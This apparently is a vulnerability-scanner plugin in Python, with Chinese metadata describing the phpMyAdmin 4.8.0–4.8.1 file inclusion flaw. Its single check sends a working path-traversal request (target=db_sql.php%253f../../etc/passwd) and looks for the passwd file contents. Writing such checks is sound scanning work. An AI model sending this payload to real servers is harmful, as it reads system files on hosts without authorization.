# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "phpMyAdmin后台文件包含漏洞",
        "version": "phpMyAdmin 4.8.0-4.8.1版本",
        "description": "攻击者利用发现在服务器上包含（查看和潜在执行）文件的漏洞。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。 攻击者必须经过身份验证，但在这些情况下除外：$ cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码；$ cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码。",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='GET',
            path='./index.php?target=db_sql.php%253f../../../../../../../../etc/passwd',
            timeout=15,
        )
        if r.status_code == 200 and "root:x:0:0" in r.text:
            return {"LoopholeInfo": self.__info__}
